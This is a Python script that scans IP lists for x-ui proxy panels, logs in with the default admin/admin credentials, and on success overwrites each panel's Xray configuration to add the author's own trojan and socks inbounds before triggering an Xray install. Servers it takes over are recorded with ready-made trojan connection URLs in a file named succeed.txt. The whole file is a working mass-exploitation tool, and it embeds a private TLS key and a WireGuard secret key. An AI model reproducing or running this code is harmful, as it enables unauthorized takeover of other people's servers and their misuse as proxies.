import re
import requests
from concurrent.futures import ThreadPoolExecutor

data = {
    'username': 'admin',
    'password': 'admin'
}

def get_ip_info(ip):
    url = f"http://ip-api.com/json/{ip}?fields=countryCode,as"
    try:
        response = requests.get(url, timeout=2)
        if response.status_code == 200:
            ip_info = response.json()
            country_code = ip_info.get('countryCode', 'N/A')
            isp = ip_info.get('as', 'N/A')
            return f"{country_code}-{isp}"
    except requests.exceptions.RequestException:
        pass
    return 'N/A'

def try_login(ip, protocol, port):
    url = f"{protocol}://{ip}:{port}/login"
    for _ in range(3):
        try:
            response = requests.post(url, data=data, timeout=2, verify=(protocol == "https"))
            if response.status_code == 200:
                try:
                    response_data = response.json()
                    if isinstance(response_data, dict) and response_data.get("success"):
                        ip_info = get_ip_info(ip)
                        result = f"trojan://mikuu404@{ip}:23331/?security=tls&sni=bing.com&allowInsecure=1&type=ws&path=/&host=bing.con#{ip_info}-{ip}:{port}"
                        with open("succeed.txt", "a") as xui_file:
                            xui_file.write(result + '\n')
                        setting_update_url = f"{protocol}://{ip}:{port}/xui/setting/update"
                        setting_update_body = {
                            'webListen': '',
    'webPort': '54321',
    'webCertFile': '',
    'webKeyFile': '',
    'webBasePath': '/',
    'xrayTemplateConfig': '{\n  "api": {\n    "services": [\n      "HandlerService",\n      "LoggerService",\n      "StatsService"\n    ],\n    "tag": "api"\n  },\n  "inbounds": [\n    {\n      "listen": "127.0.0.1",\n      "port": 62789,\n      "protocol": "dokodemo-door",\n      "settings": {\n        "address": "127.0.0.1"\n      },\n      "tag": "api"\n    },\n    {\n      "listen": null,\n      "port": 23331,\n      "protocol": "trojan",\n      "settings": {\n        "clients": [\n          {\n            "password": "mikuu404"\n          }\n        ],\n        "fallbacks": []\n      },\n      "sniffing": {\n        "destOverride": [\n          "http",\n          "tls"\n        ],\n        "enabled": true\n      },\n      "streamSettings": {\n        "network": "ws",\n        "security": "tls",\n        "tlsSettings": {    \n          "certificates": [\n            {\n              "certificate": [\n                "-----BEGIN CERTIFICATE-----",\n                "MIIBfjCCASOgAwIBAgIUOAmyyu6MPkKA96FzOskC2gG8uk8wCgYIKoZIzj0EAwIw",\n                "EzERMA8GA1UEAwwIYmluZy5jb20wIBcNMjQwMjEwMDgwNTAwWhgPMjEyNDAxMTcw",\n                "ODA1MDBaMBMxETAPBgNVBAMMCGJpbmcuY29tMFkwEwYHKoZIzj0CAQYIKoZIzj0D",\n                "AQcDQgAEKdltiO15Qj4fu5Yc0IJsnCh7AJZZre5YEjIXfpp9yMwq/MWvyzRkClEG",\n                "U3imkk4w8oxRx5rOTCJzYRfkOiAJLaNTMFEwHQYDVR0OBBYEFC5Rn33Ioi7PJlhJ",\n                "58VH5qgeIDlPMB8GA1UdIwQYMBaAFC5Rn33Ioi7PJlhJ58VH5qgeIDlPMA8GA1Ud",\n                "EwEB/wQFMAMBAf8wCgYIKoZIzj0EAwIDSQAwRgIhAOovOO7FVMPkOl1rs87BRn5A",\n                "Ggb7PkWtYCtTE+lLrvTYAiEAu5v6FhjOG2p46e2CkQA2ls7dfaRrRKtL8tNcuLQz",\n                "naY=",\n                "-----END CERTIFICATE-----"\n              ],\n              "key": [\n                "-----BEGIN PRIVATE KEY-----",\n                "MIGHAgEAMBMGByqGSM49AgEGCCqGSM49AwEHBG0wawIBAQQgFX5SI9gUqxD+ekAg",\n                "FEb0xUQLso2j1rfDU5lh9BdPgJ+hRANCAAQp2W2I7XlCPh+7lhzQgmycKHsAllmt",\n                "7lgSMhd+mn3IzCr8xa/LNGQKUQZTeKaSTjDyjFHHms5MInNhF+Q6IAkt",\n                "-----END PRIVATE KEY-----"\n              ],\n              "ocspStapling": 3600\n            }\n          ]\n        },\n        "wsSettings": {\n          "headers": {},\n          "path": "/"\n        }\n      }\n    },\n    {\n      "port": 23332,\n      "protocol": "socks",\n      "settings": {\n        "auth": "password",\n        "accounts": [\n          {\n            "user": "mikuu404",\n            "pass": "mikuu404"\n          }\n        ]\n      }\n    }\n  ],\n  "outbounds": [\n    {\n      "protocol": "freedom",\n      "settings": {}\n    },\n    {\n      "protocol": "blackhole",\n      "settings": {},\n      "tag": "blocked"\n    },\n      {\n      "tag": "WARP",\n      "protocol": "wireguard",\n      "settings": {\n        "secretKey": "wBgj79mhiENspSFQHIULqHP8IKFJJcdq37R51DJvDlk=",\n        "address": [\n          "172.16.0.2/32"\n        ],\n        "peers": [\n          {\n            "publicKey": "bmXOC+F1FxEMF9dyiK2H5/1SUtzH0JuVo51h2wPfgyo=",\n            "allowedIPs": [\n              "0.0.0.0/0",\n              "::/0"\n            ],\n            "endpoint": "engage.cloudflareclient.com:2408"\n          }\n        ],\n        "reserved": [249,159,96]\n      }\n     }\n  ],\n  "policy": {\n    "system": {\n      "statsInboundDownlink": true,\n      "statsInboundUplink": true\n    }\n  },\n  "routing": {\n    "rules": [\n      {\n        "inboundTag": [\n          "api"\n        ],\n        "outboundTag": "api",\n        "type": "field"\n      },\n      {\n        "type": "field",\n        "outboundTag": "WARP",\n        "domain": ["cloudflare","geosite:abema","colorfulpalette.org","pilipiliultra"]\n      },\n      {\n        "ip": [\n          "geoip:private"\n        ],\n        "outboundTag": "blocked",\n        "type": "field"\n      },\n      {\n        "outboundTag": "blocked",\n        "protocol": [\n          "bittorrent"\n        ],\n        "type": "field"\n      }\n    ]\n  },\n  "stats": {}\n}',
    'timeLocation': 'Asia/Shanghai',
                        }
                        try:
                            setting_update_response = requests.post(setting_update_url, data=setting_update_body, cookies=response.cookies.get_dict(), timeout=5)
                            print("Body: " + setting_update_response.text)
                        except Exception as e:
                            print(str(e))
                        install_url = f"http://{ip}:{port}/server/installXray/v1.7.5"
                        try:
                            install_response = requests.post(install_url, cookies=response.cookies.get_dict(), timeout=5)
                            print("Install Response Body: " + install_response.text)
                        except Exception as e:
                            print(str(e))
                        return result
                except ValueError:
                    return f"Invalid JSON response from: {url}"
        except requests.exceptions.RequestException:
            pass
    return f"{ip}:{port} Def"

def process_ip(ip_line):
    match = re.match(r".*Host:\s+(\d+\.\d+\.\d+\.\d+).*Ports:\s+(\d+)", ip_line)
    if match:
        ip = match.group(1)
        port = match.group(2)
        result = try_login(ip, "http", port) or try_login(ip, "https", port)
        if result:
            print(result)

if __name__ == "__main__":
    with open("results.txt", "r") as file:
        ip_lines = [line.strip() for line in file if "Host:" in line and "Ports:" in line]

    with ThreadPoolExecutor() as executor:
        executor.map(process_ip, ip_lines)
